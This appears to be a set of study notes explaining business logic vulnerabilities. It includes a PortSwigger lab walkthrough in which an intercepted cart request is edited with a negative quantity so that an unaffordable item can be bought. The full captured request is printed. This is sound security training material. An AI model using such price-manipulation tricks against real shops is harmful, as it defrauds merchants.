# What are business logic vulnerabilities?

Business logic vulnerabilities are flaws in an application's rules that allow users to perform unintended actions. These issues do not come from technical errors like SQL injection but from incorrect or incomplete design of how the system should behave. Attackers exploit these flaws by interacting with the application in ways developers did not expect.

Business logic defines how an application works, such as enforcing payment before access, limiting coupon usage, or maintaining a proper workflow. When these rules are not properly enforced, users may bypass restrictions, skip steps, or manipulate important values like price or quantity.

These vulnerabilities are difficult to detect with automated tools because they require understanding the application's intended behavior and thinking creatively about how it can be misused. As a result, they are commonly found through manual testing and are a major focus in bug bounty programs.

In simple terms, business logic vulnerabilities occur when an application follows flawed rules, allowing attackers to abuse normal functionality for malicious purposes.


# Examples of business logic vulnerabilities

## Excessive trust in client-side controls

Excessive trust in client-side controls happens when an application relies on browser-side validation to secure user input. Developers assume users will only interact through the web interface, but attackers can intercept and modify requests using tools like Burp Suite, bypassing these controls. Since client-side validation can be easily ignored, accepting data without proper server-side checks allows attackers to manipulate inputs such as price, quantity, or permissions. This can lead to serious security and business impact. In short, client-side controls are not trustworthy, and all critical validation must be enforced on the server side.

- Lab: Excessive trust in client-side controls - [SOLUTION](https://github.com/OxL3on/Cybersecurity-playground/blob/main/PORTSWIGGER%20labs/Business%20logic%20vulnerabilities/Labs.md#lab-excessive-trust-in-client-side-controls)
- Lab: 2FA broken logic - [SOLUTION](https://github.com/OxL3on/Cybersecurity-playground/blob/main/PORTSWIGGER%20labs/Business%20logic%20vulnerabilities/Labs.md#lab-2fa-broken-logic)


## Failing to handle unconventional input

First login using the given credentials. Then add Lightweight l33t leather jacket to the cart. But since you only have $100 and that item is $1337 you cant buy that. So to buy that product select a different item and add that to the cart. Capture that request in burp. 
```
POST /cart HTTP/2
Host: 0a9b003204cb6878807a30e300be00aa.web-security-academy.net
Cookie: session=UBW2tglBuwrs83Hfh9nqB3dTqt2QQejT
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Origin: https://0a9b003204cb6878807a30e300be00aa.web-security-academy.net
Referer: https://0a9b003204cb6878807a30e300be00aa.web-security-academy.net/product?productId=7
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

productId=7&redir=PRODUCT&quantity=1
```
Then make that quantity a negative number (quantity=-5) and send. The price been dropped and quantity turned to negative of the other product. Keep decreasing the quantity until the total price comes down to less than your balence ($100). After the total price comes down you can buy that product and solve the lab.

- Lab: High-level logic vulnerability - [SOLUTION](https://github.com/OxL3on/Cybersecurity-playground/blob/main/PORTSWIGGER%20labs/Business%20logic%20vulnerabilities/Labs.md#lab-high-level-logic-vulnerability)
- Lab: Low-level logic flaw - [SOLUTION](https://github.com/OxL3on/Cybersecurity-playground/blob/main/PORTSWIGGER%20labs/Business%20logic%20vulnerabilities/Labs.md#lab-low-level-logic-flaw)
